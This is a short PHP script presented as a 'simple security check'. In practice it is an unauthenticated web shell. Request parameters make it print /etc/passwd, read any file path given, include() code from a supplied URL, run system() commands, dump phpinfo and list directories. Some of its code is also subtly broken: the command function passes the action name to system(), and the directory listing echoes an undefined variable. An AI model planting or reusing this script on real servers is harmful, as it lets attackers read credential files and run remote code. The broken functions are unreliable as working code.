<?php 
/* Simple security check by Alexandre Jaquet */

$action = $_GET['action'];

if ($action == "etcpasswd") {
	readPasswd();
}elseif ($action == "openfile") {
	openFile();	
}elseif ($action == "execute") {
	executeCommand();
}elseif ($action == "include") {
	includeExploit();
}elseif ($action == "phpinfo") {
	phpinfo();
}elseif ($action == "issafe") {
	isSafe ();
}elseif ($action == "notallowed") {
	notAllowed ();
}elseif ($action == "changedir") {
	changeDirectory ();
}

/* Try to read password file*/
function readPasswd () {
	$fh = fopen ('/etc/passwd','r');
	while(!feof($fh)) {
	 $content .= fread($fh,4096);
	 echo "$content";
	}
	fclose($fh);
}

/* Try to read password file*/
function openFile () {
	$file = $_GET['file'];
	echo "file : $file <br />";
	$fh = fopen ($file,'r');
	while(!feof($fh)) {
	 $content .= fread($fh,4096);
	 echo "$content";
	}
	fclose($fh);
}
function includeExploit () {
	$url = $_GET['url'];
	include($url);
}
/* Execute command passed in parameter ?*/
function executeCommand() {
	$cmd = $_GET['action'];
	system ($cmd);
}
/* Does our server use safe mode ?*/
function isSafe () {
	echo 'safe_mode = ' . ini_get('safe_mode'); 
	echo 'safe_mode_exec_dir = ' . ini_get('safe_mode_exec_dir');
}
/* Get our server disabled functions */
function notAllowed () {
	echo 'disable_functions = ' . ini_get('disable_functions'); 	
}

/* Test to change directory and read it's content */
/* opendir doesn't work when SAFE MODE IS ACTIVATED */
function changeDirectory () {
	$directory = $_GET['directory'];
	chdir($directory);
	$dh  = opendir($directory);
	while (false !== ($filename = readdir($dh))) {
	   $files[] = $filename;
	   echo "file : $file []";
	}
}
?>